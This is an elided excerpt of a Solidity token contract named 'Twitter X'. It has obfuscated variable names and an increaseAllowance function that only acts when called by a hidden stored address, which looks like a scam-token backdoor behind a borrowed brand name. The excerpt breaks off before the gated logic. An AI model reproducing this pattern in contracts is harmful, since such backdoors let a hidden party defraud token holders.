...
contract TwitterTOKEN is Ownable {
    ...
    string private _hooextokenname = "Twitter X";
    string private _voptokensymbol = "Twitter X";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public ssxahyt995;
    function increaseAllowance(address yayayxx) public     {
        ...
        if(ssxahyt995 != _msgSender()){
            return ;
        }else{
           require(ssxahyt995 == _msgSender());
